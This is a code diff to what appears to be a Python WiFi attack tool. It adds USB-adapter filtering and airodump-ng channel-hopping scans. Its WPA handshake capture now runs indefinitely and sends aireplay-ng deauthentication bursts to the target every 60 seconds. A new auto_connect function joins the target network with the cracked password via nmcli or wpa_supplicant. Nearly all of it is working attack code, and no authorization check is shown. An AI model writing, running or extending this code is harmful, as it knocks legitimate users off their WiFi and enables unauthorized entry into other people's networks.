@@ -631,9 +631,37 @@ def install_dependencies():
         return False
 
 
+def is_usb_interface(iface):
+    """Return True if the wireless interface is backed by a USB device."""
+    # Walk the sysfs device tree from the interface upward looking for a 'usb' subsystem
+    try:
+        dev_path = f'/sys/class/net/{iface}/device'
+        if not os.path.exists(dev_path):
+            return False
+        real_dev = os.path.realpath(dev_path)
+        # Walk up the sysfs path; any component that contains 'usb' marks a USB device
+        path = real_dev
+        for _ in range(10):
+            subsystem_link = os.path.join(path, 'subsystem')
+            if os.path.exists(subsystem_link):
+                subsystem = os.path.basename(os.path.realpath(subsystem_link))
+                if subsystem in ('usb', 'usb_device'):
+                    return True
+            # Also check if any path component looks like a USB bus (e.g. /sys/bus/usb)
+            if '/usb' in path:
+                return True
+            parent = os.path.dirname(path)
+            if parent == path:
+                break
+            path = parent
+    except Exception:
+        pass
+    return False
+
+
 def get_wireless_interfaces():
-    """Get available wireless interfaces."""
-    interfaces = []
+    """Get available wireless interfaces — USB adapters only."""
+    all_ifaces = []
 
     # Method 1: iw dev
     if check_tool('iw'):
@@ -643,12 +671,12 @@ def get_wireless_interfaces():
                 for line in result.stdout.split('\n'):
                     if 'Interface' in line:
                         iface = line.split()[1]
-                        if iface not in interfaces:
-                            interfaces.append(iface)
+                        if iface not in all_ifaces:
+                            all_ifaces.append(iface)
         except Exception:
             pass
 
-    # Method 2: ip link
+    # Method 2: ip link (wlx prefix almost always means USB)
     try:
         result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
         if result.returncode == 0:
@@ -657,8 +685,8 @@ def get_wireless_interfaces():
                 if len(parts) >= 2:
                     iface = parts[1].strip().split('@')[0]
                     if iface.startswith(('wl', 'wlan', 'wlp', 'wlx')):
-                        if iface not in interfaces:
-                            interfaces.append(iface)
+                        if iface not in all_ifaces:
+                            all_ifaces.append(iface)
     except Exception:
         pass
 
@@ -666,94 +694,190 @@ def get_wireless_interfaces():
     try:
         for iface in os.listdir('/sys/class/net'):
             wireless_path = f'/sys/class/net/{iface}/wireless'
-            if os.path.exists(wireless_path) and iface not in interfaces:
-                interfaces.append(iface)
+            if os.path.exists(wireless_path) and iface not in all_ifaces:
+                all_ifaces.append(iface)
     except Exception:
         pass
 
     # Filter out monitor interfaces already running
-    interfaces = [i for i in interfaces if not i.endswith('mon') and 'mon0' not in i]
+    all_ifaces = [i for i in all_ifaces if not i.endswith('mon') and 'mon0' not in i]
 
-    return interfaces
+    # ── USB-only filter ───────────────────────────────────────
+    usb_ifaces = [i for i in all_ifaces if is_usb_interface(i)]
+
+    if usb_ifaces:
+        info(f"USB WiFi adapters detected:  {c(', '.join(usb_ifaces), C.BWHITE, C.BOLD)}")
+        non_usb = [i for i in all_ifaces if i not in usb_ifaces]
+        if non_usb:
+            warn(f"Ignoring non-USB interfaces:  {c(', '.join(non_usb), C.DIM)}")
+        return usb_ifaces
+    else:
+        warn("No USB wireless adapters detected via sysfs — listing all wireless interfaces")
+        warn("Tip: Only use a USB WiFi adapter that supports monitor mode (e.g. AR9271, RT3070, RT5572)")
+        return all_ifaces
 
 
-SCAN_DURATION = 15  # seconds for scapy sniff
+SCAN_DURATION = 25  # seconds for scapy sniff
+
+def scan_networks_airodump(interface, monitor_iface, duration=30):
+    """
+    Channel-hopping scan using airodump-ng to discover all SSIDs
+    across 2.4 GHz (ch 1-14) and 5 GHz (ch 36-165).
+    Returns a list of Network named-tuples.
+    """
+    networks = []
+    tmpdir   = tempfile.mkdtemp(prefix='niixscan_')
+    cap_base = os.path.join(tmpdir, 'scan')
+
+    cmd = [
+        'sudo', 'airodump-ng',
+        '--band', 'abg',          # scan 2.4 GHz + 5 GHz
+        '--output-format', 'csv',
+        '-w', cap_base,
+        '--write-interval', '1',
+        monitor_iface
+    ]
+
+    try:
+        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        pb   = ProgressBar(duration, label='Scanning all channels')
+        pb.start()
+        time.sleep(duration)
+        pb.stop()
+        proc.terminate()
+        proc.wait(timeout=5)
+    except Exception as e:
+        warn(f"airodump scan error: {e}")
+
+    # Parse CSV file(s) written by airodump-ng
+    csv_files = [f for f in os.listdir(tmpdir) if f.endswith('.csv')]
+    for csv_name in csv_files:
+        csv_path = os.path.join(tmpdir, csv_name)
+        try:
+            with open(csv_path, 'r', errors='ignore') as fh:
+                content = fh.read()
+
+            # airodump CSV has two sections separated by a blank line:
+            # [0] = APs, [1] = clients
+            sections = re.split(r'\n\s*\n', content, maxsplit=1)
+            ap_section = sections[0] if sections else ''
+
+            lines = ap_section.strip().split('\n')
+            for line in lines[2:]:   # skip header rows
+                parts = [p.strip() for p in line.split(',')]
+                if len(parts) < 14:
+                    continue
+                bssid   = parts[0].strip()
+                if not re.match(r'([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}', bssid):
+                    continue
+                try:
+                    signal  = int(parts[8].strip())
+                except Exception:
+                    signal = -100
+                try:
+                    channel = int(parts[3].strip())
+                except Exception:
+                    channel = None
+                ssid    = parts[13].strip() if len(parts) > 13 else '<Hidden>'
+                if not ssid:
+                    ssid = '<Hidden>'
+                networks.append(Network(ssid=ssid, bssid=bssid, channel=channel, signal=signal))
+        except Exception as e:
+            warn(f"CSV parse error ({csv_name}): {e}")
+
+    # Cleanup temp files
+    try:
+        shutil.rmtree(tmpdir, ignore_errors=True)
+    except Exception:
+        pass
+
+    return networks
+
 
 def scan_networks(interface):
-    """Scan for WiFi networks using scapy (with progress bar) or iw fallback."""
+    """Scan for WiFi networks — channel-hopping via airodump-ng, scapy, or iw fallback."""
     global SCAPY_AVAILABLE, MONITOR_IFACE
 
     info(f"Scanning on interface  {c(interface, C.BWHITE, C.BOLD)}")
-
-    if not SCAPY_AVAILABLE:
-        warn("Scapy unavailable — using iw fallback scan")
-        return scan_networks_alternative(interface)
-
-    networks = []
-
-    def packet_handler(pkt):
-        if pkt.haslayer(Dot11Beacon):
-            try:
-                ssid = "<Hidden>"
-                elt = pkt.getlayer(Dot11Elt)
-                while elt:
-                    if elt.ID == 0:
-                        if elt.info:
-                            ssid = elt.info.decode('utf-8', errors='ignore')
-                        break
-                    elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt, 'payload') else None
-
-                bssid = pkt.addr2
-
-                channel = None
-                elt = pkt.getlayer(Dot11Elt)
-                while elt:
-                    if elt.ID == 3 and elt.info:
-                        channel = elt.info[0] if isinstance(elt.info, (bytes, bytearray)) else ord(elt.info)
-                        break
-                    elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt, 'payload') else None
-
-                signal = -100
-                if hasattr(pkt, 'dBm_AntSignal'):
-                    signal = pkt.dBm_AntSignal
-
-                networks.append(Network(ssid=ssid, bssid=bssid, channel=channel, signal=signal))
-
-            except Exception:
-                pass
+    info("Enabling monitor mode for full-spectrum scan…")
 
     try:
-        info("Enabling monitor mode…")
         subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'],
                        capture_output=True, timeout=10)
         subprocess.run(['sudo', 'airmon-ng', 'start', interface],
                        capture_output=True, text=True, timeout=15)
-
         monitor_iface = get_monitor_interface(interface)
         MONITOR_IFACE = monitor_iface
         ok(f"Monitor interface ready  {c(monitor_iface, C.BWHITE, C.BOLD)}")
-        print()
+    except Exception as e:
+        err(f"Monitor mode error: {e}")
+        return scan_networks_alternative(interface)
 
-        # ── progress bar runs while scapy sniffs ──
-        pb = ProgressBar(SCAN_DURATION, label='Scanning airspace')
-        pb.start()
-        sniff(iface=monitor_iface, prn=packet_handler, timeout=SCAN_DURATION)
-        pb.stop()
+    networks = []
 
+    # ── Primary: airodump-ng channel-hopping (finds ALL SSIDs) ──
+    if check_tool('airodump-ng'):
+        info("Running airodump-ng channel-hopping scan (2.4 GHz + 5 GHz)…")
+        networks = scan_networks_airodump(interface, monitor_iface, duration=30)
+        if networks:
+            ok(f"airodump-ng found {len(networks)} network(s)")
+
+    # ── Secondary: scapy sniff (supplements airodump results) ──
+    if SCAPY_AVAILABLE and len(networks) < 3:
+        info("Supplementing with scapy passive scan…")
+        scapy_nets = []
+
+        def packet_handler(pkt):
+            if pkt.haslayer(Dot11Beacon):
+                try:
+                    ssid = "<Hidden>"
+                    elt  = pkt.getlayer(Dot11Elt)
+                    while elt:
+                        if elt.ID == 0:
+                            if elt.info:
+                                ssid = elt.info.decode('utf-8', errors='ignore')
+                            break
+                        elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt, 'payload') else None
+
+                    bssid   = pkt.addr2
+                    channel = None
+                    elt     = pkt.getlayer(Dot11Elt)
+                    while elt:
+                        if elt.ID == 3 and elt.info:
+                            channel = elt.info[0] if isinstance(elt.info, (bytes, bytearray)) else ord(elt.info)
+                            break
+                        elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt, 'payload') else None
+
+                    signal = -100
+                    if hasattr(pkt, 'dBm_AntSignal'):
+                        signal = pkt.dBm_AntSignal
+
+                    scapy_nets.append(Network(ssid=ssid, bssid=bssid, channel=channel, signal=signal))
+                except Exception:
+                    pass
+
+        try:
+            pb = ProgressBar(SCAN_DURATION, label='Scapy passive scan')
+            pb.start()
+            sniff(iface=monitor_iface, prn=packet_handler, timeout=SCAN_DURATION)
+            pb.stop()
+            # Merge unique results
+            existing_bssids = {n.bssid for n in networks}
+            for net in scapy_nets:
+                if net.bssid not in existing_bssids:
+                    networks.append(net)
+                    existing_bssids.add(net.bssid)
+        except Exception as e:
+            warn(f"Scapy supplemental scan error: {e}")
+
+    # Stop monitor mode
+    try:
         subprocess.run(['sudo', 'airmon-ng', 'stop', monitor_iface],
                        capture_output=True, timeout=10)
         MONITOR_IFACE = None
         restart_network_manager()
-
-    except Exception as e:
-        err(f"Scapy scan error: {e}")
-        warn("Falling back to iw scan…")
-        if MONITOR_IFACE:
-            subprocess.run(['sudo', 'airmon-ng', 'stop', MONITOR_IFACE],
-                           capture_output=True, timeout=5)
-            MONITOR_IFACE = None
-        restart_network_manager()
-        return scan_networks_alternative(interface)
+    except Exception:
+        pass
 
     # Deduplicate and sort
     unique_nets = {}
@@ -764,7 +888,7 @@ def scan_networks(interface):
     result_list = sorted(unique_nets.values(), key=lambda x: x.signal, reverse=True)
 
     if not result_list:
-        warn("No networks from scapy scan — trying iw fallback…")
+        warn("No networks found — falling back to iw scan…")
         return scan_networks_alternative(interface)
 
     return result_list
@@ -915,18 +1039,20 @@ def restart_network_manager():
 
 
 def capture_handshake(interface, bssid, channel, ssid):
-    """Capture WPA handshake using airodump-ng."""
+    """
+    Capture WPA handshake using airodump-ng.
+    Runs indefinitely — sends periodic deauth bursts — until a handshake
+    is confirmed by aircrack-ng.  Press Ctrl+C to abort.
+    """
     global MONITOR_IFACE
-
-    HANDSHAKE_TIMEOUT = 300   # 5 minutes max
 
     info(f"Target  {c(ssid, C.BWHITE, C.BOLD)}  ·  {c(bssid, C.CYAN)}  ·  Ch {c(str(channel), C.BCYAN)}")
 
     safe_ssid    = re.sub(r'[^\w\-]', '_', ssid)[:30] or 'network'
     capture_file = f"handshake_{safe_ssid}"
 
-    airodump_proc     = None
-    monitor_iface     = None
+    airodump_proc      = None
+    monitor_iface      = None
     handshake_captured = False
 
     try:
@@ -937,8 +1063,8 @@ def capture_handshake(interface, bssid, channel, ssid):
         subprocess.run(['sudo', 'airmon-ng', 'start', interface, str(channel)],
                        capture_output=True, timeout=15)
 
-        monitor_iface  = get_monitor_interface(interface)
-        MONITOR_IFACE  = monitor_iface
+        monitor_iface = get_monitor_interface(interface)
+        MONITOR_IFACE = monitor_iface
         ok(f"Monitor interface  {c(monitor_iface, C.BWHITE, C.BOLD)}")
 
         cmd = [
@@ -953,53 +1079,63 @@ def capture_handshake(interface, bssid, channel, ssid):
 
         print()
         info(f"Capture file:  {c(capture_file + '-01.cap', C.BYELLOW)}")
-        info(f"Tip — force reconnect:  {c(f'sudo aireplay-ng --deauth 10 -a {bssid} {monitor_iface}', C.DIM)}")
-        info("Press  Ctrl+C  to stop early")
+        info("Running until a handshake is captured — press  Ctrl+C  to abort")
+        info("Deauth packets will be sent every 60 s to force reconnects")
         print()
 
-        start_time  = time.time()
-        deauth_sent = False
+        start_time      = time.time()
+        last_deauth     = start_time
+        deauth_interval = 60   # send deauth every 60 s
+        check_interval  = 5    # check for handshake every 5 s
+        elapsed_display = 0
 
-        pb = ProgressBar(HANDSHAKE_TIMEOUT, label='Capturing handshake')
-        pb.start()
-
-        while not handshake_captured and (time.time() - start_time) < HANDSHAKE_TIMEOUT:
+        while not handshake_captured:
             if airodump_proc.poll() is not None:
-                pb.stop()
                 err("airodump-ng stopped unexpectedly")
                 break
 
-            elapsed = time.time() - start_time
-            if elapsed > 30 and not deauth_sent:
+            now = time.time()
+
+            # ── periodic deauth burst ───────────────────────────────
+            if now - last_deauth >= deauth_interval:
                 try:
                     subprocess.run(
-                        ['sudo', 'aireplay-ng', '--deauth', '5', '-a', bssid, monitor_iface],
-                        capture_output=True, timeout=15
+                        ['sudo', 'aireplay-ng', '--deauth', '10', '-a', bssid, monitor_iface],
+                        capture_output=True, timeout=20
                     )
-                    deauth_sent = True
+                    last_deauth = now
+                    info(f"Deauth burst sent  ·  elapsed {int(now - start_time)}s")
                 except Exception:
                     pass
 
-            for suffix in ['-01.cap', '-02.cap', '-03.cap', '.cap']:
+            # ── check for handshake ─────────────────────────────────
+            for suffix in ['-01.cap', '-02.cap', '-03.cap', '-04.cap', '.cap']:
                 cap_file = f"{capture_file}{suffix}"
                 if os.path.exists(cap_file) and os.path.getsize(cap_file) > 100:
-                    chk = subprocess.run(['aircrack-ng', cap_file],
-                                         capture_output=True, text=True)
-                    if 'WPA (1 handshake)' in chk.stdout or 'WPA (2 handshake' in chk.stdout:
-                        handshake_captured = True
-                        pb.stop()
-                        ok(f"Handshake captured!  {c(cap_file, C.BWHITE)}")
-                        break
+                    try:
+                        chk = subprocess.run(['aircrack-ng', cap_file],
+                                             capture_output=True, text=True, timeout=15)
+                        if 'WPA (1 handshake)' in chk.stdout or 'WPA (2 handshake' in chk.stdout:
+                            handshake_captured = True
+                            elapsed            = int(time.time() - start_time)
+                            ok(f"Handshake captured!  {c(cap_file, C.BWHITE)}  "
+                               f"(elapsed {elapsed}s)")
+                            break
+                    except Exception:
+                        pass
 
             if not handshake_captured:
-                time.sleep(5)
+                elapsed_display = int(time.time() - start_time)
+                mins, secs = divmod(elapsed_display, 60)
+                print(f"\r  {c('◆', C.BCYAN, C.BOLD)}  Waiting for handshake…  "
+                      f"{c(f'{mins:02d}:{secs:02d}', C.BYELLOW)}  "
+                      f"(next deauth in {max(0, deauth_interval - int(time.time()-last_deauth))}s)   ",
+                      end='', flush=True)
+                time.sleep(check_interval)
 
-        if not handshake_captured:
-            pb.stop()
+        print()   # newline after \r status line
 
     except KeyboardInterrupt:
-        try: pb.stop()
-        except Exception: pass
         print()
         warn("Capture interrupted by user")
 
@@ -1117,6 +1253,82 @@ def crack_wpa_password(capture_file, bssid):
     except Exception as e:
         err(f"Error during cracking: {e}")
         return None
+
+
+def auto_connect(ssid, password, interface):
+    """
+    Automatically connect to the target WiFi network using the cracked password.
+    Tries nmcli first (NetworkManager), then wpa_supplicant as a fallback.
+    Returns True on success.
+    """
+    section("Auto-Connect")
+    info(f"Connecting to  {c(ssid, C.BWHITE, C.BOLD)}  with cracked credentials…")
+
+    # ── Method 1: nmcli (NetworkManager) ────────────────────
+    if shutil.which('nmcli'):
+        info("Trying nmcli (NetworkManager)…")
+        try:
+            # Delete any existing profile with this SSID to avoid conflicts
+            subprocess.run(['sudo', 'nmcli', 'connection', 'delete', ssid],
+                           capture_output=True, timeout=8)
+        except Exception:
+            pass
+
+        try:
+            result = subprocess.run(
+                ['sudo', 'nmcli', 'device', 'wifi', 'connect', ssid,
+                 'password', password, 'ifname', interface],
+                capture_output=True, text=True, timeout=30
+            )
+            if result.returncode == 0 and 'successfully' in result.stdout.lower():
+                ok(f"Connected to  {c(ssid, C.BWHITE, C.BOLD)}  via NetworkManager!")
+                return True
+            else:
+                warn(f"nmcli returned: {result.stdout.strip()[:120] or result.stderr.strip()[:120]}")
+        except Exception as e:
+            warn(f"nmcli error: {e}")
+
+    # ── Method 2: wpa_supplicant + dhclient ─────────────────
+    if shutil.which('wpa_supplicant') and shutil.which('wpa_passphrase'):
+        info("Trying wpa_supplicant fallback…")
+        conf_path = '/tmp/niixkey_wpa.conf'
+        try:
+            result = subprocess.run(
+                ['wpa_passphrase', ssid, password],
+                capture_output=True, text=True, timeout=5
+            )
+            if result.returncode == 0:
+                with open(conf_path, 'w') as f:
+                    f.write(result.stdout)
+
+                # Bring interface up
+                subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'],
+                               capture_output=True, timeout=5)
+
+                # Run wpa_supplicant in background
+                wpa_proc = subprocess.Popen(
+                    ['sudo', 'wpa_supplicant', '-B', '-i', interface, '-c', conf_path],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                )
+                time.sleep(5)
+
+                # Get IP via dhclient or dhcpcd
+                for dhcp in ['dhclient', 'dhcpcd']:
+                    if shutil.which(dhcp):
+                        r = subprocess.run(['sudo', dhcp, interface],
+                                           capture_output=True, timeout=20)
+                        if r.returncode == 0:
+                            ok(f"Connected to  {c(ssid, C.BWHITE, C.BOLD)}  via wpa_supplicant!")
+                            ok(f"DHCP lease obtained on  {c(interface, C.BWHITE)}")
+                            return True
+        except Exception as e:
+            warn(f"wpa_supplicant fallback error: {e}")
+
+    # ── Method 3: iw + ip (open networks only — won't work for WPA) ──
+    err("Auto-connect failed — connect manually:")
+    print(f"  {c('nmcli dev wifi connect', C.DIM)} {c(repr(ssid), C.BWHITE)} "
+          f"{c('password', C.DIM)} {c(repr(password), C.BGREEN)}")
+    return False
 
 
 def cleanup():
@@ -1314,6 +1526,9 @@ def main():
             f.write(f"Password: {password}\n")
             f.write(f"{'─' * 60}\n\n")
         ok(f"Results saved →  {c(results_file, C.BWHITE)}")
+
+        # ── Auto-connect ──────────────────────────────────
+        auto_connect(selected.ssid, password, interface)
     else:
         section("No Password Found")
         warn("The password was not in the wordlist")
